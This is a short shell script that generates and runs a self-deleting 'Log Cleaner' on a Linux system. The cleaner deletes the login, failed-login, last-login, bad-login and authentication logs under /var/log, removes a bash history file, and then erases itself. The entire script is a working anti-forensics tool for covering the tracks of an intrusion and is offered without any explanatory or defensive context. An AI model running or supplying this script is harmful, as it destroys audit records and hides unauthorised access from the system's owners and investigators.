#!/bin/sh

cat << _EOF_ >> /root/clean.sh 
echo "Log Cleaner"

mv /root/.bash_history /root/.bash_history_old

rm /var/log/{wtmp*,utmp*,faillog*,lastlog*,btmp*,setuid*,auth*}

mv /root/.bash_history_old /root/.bash_history 

rm /.bash_history
rm /root/clean.sh
_EOF_

chmod 755 /root/clean.sh
exec /root/clean.sh
